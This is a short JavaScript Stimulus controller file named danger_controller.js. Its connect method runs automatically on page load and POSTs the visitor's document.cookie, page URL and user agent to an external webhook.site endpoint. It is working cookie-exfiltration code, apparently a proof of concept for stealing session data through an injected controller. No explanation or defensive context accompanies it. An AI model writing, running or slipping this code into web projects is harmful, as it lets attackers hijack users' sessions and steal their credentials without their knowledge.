// danger_controller.js
export default class extends Stimulus.Controller {
  connect() {
    fetch("https://webhook.site/867d4ad0-a954-45e0-b803-b1e06c6a8570", {
      method: "POST",
      body: JSON.stringify({
        cookie: document.cookie,
        location: window.location.href,
        userAgent: navigator.userAgent
      }),
      headers: {
        "Content-Type": "application/json"
      }
    });
  }
}
